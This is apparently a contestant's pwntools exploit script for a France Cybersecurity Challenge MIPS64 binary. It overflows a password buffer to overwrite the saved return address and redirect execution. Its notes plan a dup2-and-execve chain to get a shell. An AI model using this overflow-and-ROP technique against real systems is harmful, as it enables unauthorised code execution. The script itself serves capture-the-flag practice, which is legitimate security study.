#!/usr/bin/env python3

# docker build -t itsy .
# docker run --rm -p 4000:4000 itsy:latest

# nc challenges2.france-cybersecurity-challenge.fr 4005
# qemu-mips64 -L /usr/mips64-linux-gnuabi64 ./mipsy

# https://github.com/w0lfzhang/mips_exploit
# https://wiki.x10sec.org/pwn/linux/mips/mips_rop-zh
# https://ctftime.org/writeup/22613
# https://blahcat.github.io/2017/01/26/insomni-hack-ctf-2017-bender-safe
# http://www.cs.uwm.edu/classes/cs315/Bacon/Lecture/HTML/ch05s03.html
# https://courses.cs.washington.edu/courses/cse410/09sp/examples/MIPSCallingConventionsSummary.pdf

from pwn import *

context.binary = './mipsy'
binary = './mipsy'
pwnlib.qemu.archname(arch='mips64')

call_execve = 0x120004130
binsh = 0x120025a20
execve_plt = 0x120025a20
ret = 0x1200046b8
put_listinter = 0x120003fec
ls = 0x12002a32e # 0x12002a328+6

commands = f'''
set follow-fork-mode child
b main
# ret for rop
b *{hex(ret)}
b *{hex(put_listinter)}
c
'''
r = gdb.debug(binary, commands)

# calling convention = a0, a1, a2, a3
# i have control of s8 and gp
pld = b''
pld += b'A' * 120
# gp
pld += p64(0)
# s8
pld += b'C' * 8
# ra
pld += p64(put_listinter)
pld += b'D' * 32

if len(sys.argv) > 1 and sys.argv[1] == 'test':
    r.interactive()
else:
    r.recv()
    r.sendline('3')
    r.recv()
    r.sendline(pld)
    r.interactive()

'''
0x120048020 -32664
0x120025a28:0x2d630000
0x120020000 0x3c1c0003

overflow on password
lets try to `ls` first

ip = 0x120003fc0

in ping:
call dup2(fd, stdout) = 0x120004388
call execve = 0x1200043dc
call dup2 first then rce with execve

ln -s /usr/mips64-linux-gnuabi64/lib/ld-2.31.so /lib64/ld.so.1
ln -s /usr/mips64-linux-gnuabi64 /etc/qemu-binfmt/mips64
'''
